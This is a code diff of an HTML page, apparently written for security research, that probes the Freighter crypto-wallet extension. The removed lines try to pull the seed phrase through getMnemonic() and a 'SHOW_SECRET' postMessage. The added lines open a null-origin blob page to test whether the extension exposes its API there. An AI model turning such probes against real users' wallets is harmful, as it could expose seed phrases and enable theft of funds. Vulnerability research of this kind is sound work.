@@ -1,18 +1,14 @@
+<button id="blobTest">CREATE BLOB URL & TEST FREIGHTER API</button>
 <script>
-window.addEventListener('message', e=>{
-  console.log('RECEIVED:', e.data);
-  document.body.innerHTML += `<pre>${JSON.stringify(e.data).slice(0,800)}</pre>`;
-});
-
-async function realTest(){
-  try{
-    const res = await window.freighterApi.getMnemonic(); // coba semua method
-    alert('REAL LEAK: ' + res);
-  }catch(err){
-    console.log('getMnemonic blocked:', err);
+document.getElementById('blobTest').onclick=()=>{
+  const html=`<html><body>
+  <script>
+  // blob origin = null, tapi Freighter inject provider = BUG
+  if(window.freighterApi){
+    freighterApi.getPublicKey().then(k=>alert('BUG: Got pubkey from blob: '+k))
   }
-  // coba via postMessage yang dulu CVE
-  window.postMessage({type:"SHOW_SECRET", origin:"freighter"}, "*");
-}
+  <\/script></body></html>`;
+  const blob=new Blob([html],{type:'text/html'});
+  window.open(URL.createObjectURL(blob),'_blank');
+};
 </script>
-<button onclick="realTest()">REAL TEST - NOT DUMMY</button>
